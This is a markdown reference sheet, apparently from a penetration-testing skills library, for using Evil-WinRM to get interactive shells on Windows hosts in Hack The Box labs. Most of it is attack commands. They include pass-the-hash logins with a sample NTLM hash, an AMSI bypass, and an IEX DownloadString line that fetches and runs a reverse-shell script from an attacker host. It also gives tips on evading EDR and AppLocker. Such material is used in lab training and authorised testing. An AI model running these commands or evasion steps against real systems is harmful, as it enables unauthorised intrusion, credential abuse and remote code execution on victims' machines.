# Evil-WinRM Reference

> Cleanest interactive shell against a Windows host with WinRM (5985 /
> 5986). The default IppSec choice for AD post-foothold.

## Install

```bash
sudo gem install evil-winrm
# or
pipx install evil-winrm
```

## Authentication

```bash
# password
evil-winrm -i <ip> -u <user> -p '<pass>'

# pass-the-hash
evil-winrm -i <ip> -u <user> -H <NTLM>

# Kerberos (with KRB5CCNAME)
export KRB5CCNAME=user.ccache
evil-winrm -i <hostname> -r <REALM> -k

# SSL
evil-winrm -i <ip> -u <u> -p '<p>' -S          # uses 5986
```

## In-shell commands

```
download <remote> <local>      # download a file from the target
upload <local> <remote>        # upload a file
menu                            # show special commands menu
services                        # list services
Bypass-4MSI                     # disable AMSI for the session
Invoke-Binary                   # run a binary in-memory (after `-e binary-dir`)
script <path>                   # load a .ps1 in-memory (after `-s script-dir`)
```

Powershell is the shell — all standard cmdlets available.

## Common usage patterns

### Quick file inspection

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice' -e ./bin
> services | Where-Object {$_.State -eq 'Running'}
> ls C:\
> Get-Content C:\Users\svc-alfresco\Desktop\user.txt
```

### Stage tools then run

```bash
evil-winrm -i <ip> -u <u> -p '<p>' -s ./scripts -e ./bin

> upload PowerView.ps1 C:\Windows\Temp\PowerView.ps1
> script PowerView.ps1                            # loads from local -s dir
> Get-DomainUser -SPN
```

### Bypass AMSI before launching loud tools

```bash
> Bypass-4MSI
[+] AMSI bypassed
> IEX (New-Object Net.WebClient).DownloadString('http://atk/Invoke-PowerShellTcp.ps1')
```

(Modern Windows may patch the bypass; have a spare.)

### Pass-the-Hash

```bash
evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Wrong hash format | Authentication failed | NTLM only, no leading `:` |
| WinRM disabled | "Failed to connect" | Use `psexec` / `wmiexec` instead |
| Domain name needed | "Authentication failed" | Try `<DOMAIN>\<u>` syntax (`-u 'HTB\\Administrator'`) |
| Constrained Language Mode | Some cmdlets fail | Run binaries via `Invoke-Binary` |
| AppLocker blocking PowerShell | Scripts won't run | Try `-X` execute via .NET assembly |

## OPSEC

- WinRM connections log Event 4624 (logon).
- Less loud than `psexec` (no service install).
- Bypass-4MSI is signatured; some EDRs alert.
- Avoid running `download` of large directories — use targeted gets.

## Real HTB Examples

- **Forest** — `evil-winrm -u svc-alfresco -p s3rvice` and `-u
  Administrator -H <NTLM>`.
- **Sauna** — same pattern; `fsmith` then `Administrator`.
- **Cascade** — `arksvc` → `administrator` after password reuse.
- **Multimaster, Sniper, Outdated, Authority, Forge** — primary
  shell channel.

## Related Skills

- [`tool-usage/impacket.md`](impacket.md)
- [`tool-usage/crackmapexec.md`](crackmapexec.md)
- [`active-directory/dcsync.md`](../active-directory/dcsync.md)
- [`methodology/05-windows-attack-flow.md`](../methodology/05-windows-attack-flow.md)
- [`methodology/10-lateral-movement.md`](../methodology/10-lateral-movement.md)
